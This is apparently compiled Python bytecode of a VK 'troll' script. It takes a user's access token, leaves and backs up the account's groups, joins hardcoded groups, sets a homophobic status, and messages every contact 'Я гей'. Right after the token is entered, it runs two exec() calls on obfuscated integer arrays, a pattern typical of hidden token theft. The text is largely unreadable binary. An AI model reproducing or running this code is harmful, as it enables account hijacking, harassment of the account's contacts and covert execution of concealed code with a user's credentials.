U
    �q�^$  �                B   @   s   d dl Z d dlZd dlZe�d� ddddddd	d
ddddddgZdd� Zdd� Zdd� Zdd� Ze	d� e
d�Zedkr�e
d�Zed  dks�ed  dkr�dZq�d Znd Ze
d!�Ze jed"�Ze jed#d$d%�Zz�eed&d'd(d)d*d+d,d,d&d-d+d,d)d-d+d.d/d0d1d2d+d3d,d&d.d(d0d1d,d4d5g�� eed&d'd(d)d6d&d7d7d)d8d3d+d&d.d+d/d0d*d*d+d1d.d4d0d6d1d+d3d9d(d:d;d<d=d>d?d@dAdBdAdCd=dDd'd0d,d.d9d(d:d;dAdDd*d+d,d,d&d-d+d;d.dEd5g@�� e�dF� W n   e	dG� e�  Y nX ej�� d  dH ZejjedI�dJ ZejjedI�dK Zedk�re�  ne�  dS )L�    N�cleari)�	i���i��i��Qi ��i��Hi�*�
i��iLPi��_	i�:%i�i%oi���c            	      C   s:  d} t d� tj�� d }t|d �}t|d �D �] }tjj|d dd�d }t�d� |D ]�}|d d	 d
 }z|ztjj	|d� W n   d}Y nX tjj
|dd� tjj|dd�d d d
 }tjj|dd� t�d� tjj|d� W n   d}Y nX | d7 } t dtt| | d �� d � t�d� q^q2d S )Nr   z*[FSending messages...                    �count��   �   )�offsetr   �itemsZconversationZpeer�id)Zowner_idZpidor�	   Я гей)�user_id�message)r
   r   )Zmessage_idsZdelete_for_all�      �?z[FSending messages �d   �%   )�print�apiZmessagesZgetConversations�int�range�time�sleepZaccountZunban�sendZ
getHistory�deleteZban�str)	�quantityr   ZlapsZlapr   �itemr   ZyouZmg_id� r   �troll.py�mgsp   s0    



 r   c                  C   s�   d} t dd�}|�tj�� d d � tjjdd� td� t�d	� t	D ]V}|�t
|�d � tj	j|d
� | d	7 } tdt
t| t d �� d � t�d� qJt�d� |��  td� tD ]}tj	j|d
� t�d� q�tr�t�  td� d S )Nr   �backup�w�text�
r	   �r   z
[32mGroup's deletion...    r   �Zgroup_idz[FGroup's deletion r   r   r   皙�����?z%[FAdding the gay publics...         g      �?z![FDone:)                       
)�open�writer   �status�get�setr   r   r   �groupsr   �leaver   r   �close�pubs�join�mgr   )r   r   �group�pubr   r   r   �troll   s*    

 
r1   c                  C   s�   t dd�} tjj| �� d� td� t�d� tD ]}tjj	|d� t�d� q2td� d	}|r�| �� }|d t
|�d � }|d
kr�d}q\tjjt|�d� t�d� q\td� d S )Nr   �rr!   z
[32mGay publics deletion...r   r"   r   z![FAdding the delited groups...  T� Fg�������?z*[FDone:(                                
)r$   r   r&   r(   �readliner   r   r   r)   r*   �lenr-   r   )r2   r/   Zreadingr0   r   r   r   �untroll5   s"    

r6   c                 C   s*   d}| D ]}|t t|d d ��7 }q|S )Nr3   �   r   )�chrr   )Zmassiver   �nr   r   r   �decH   s    r:   uU  [37m
 InvertedOnes        @inv_ones[32m
 ┏━━━━━┳━━━━━┳━━━━━┳━┓  ┏━┓
 ┗━┓ ┏━┫  ━  ┃  ┓  ┃ ┃  ┃ ┃
   ┃ ┃ ┃     ┫  ┗  ┃ ┗━━┫ ┗━━┓
   ┗━┛ ┗━━┻━━┻━━━━━┻━━━━┻━━━━┛

[35m[1] Troll
[2] Return
zSelect the option: [0m�1z![35mSend messages? [37my/n[0m �y�YTFz
[35mEnter the token: [0m)Zaccess_tokenz5.89Zru)�vZlangi�$  i1  i+  iP  iu.  i�'  i�3  i})  i�4  i�  i-0  iP/  ip6  i�2  iL  i�  i]7  i�-  iU&  iM#  i'  i�  i�  im	  i�  i  iL  i�	  ip  i	  i�  i�,  r#   z
[31mInvalid token
r   )r
   r   r   )Zvkr   �os�systemr,   r   r1   r6   r:   r   �inputZoptionr.   ZtkZSessionZsessionZAPIr   �execr   �quitZusersr'   r   r)   r   r   r   r   r   �<module>   s<   
 
J�
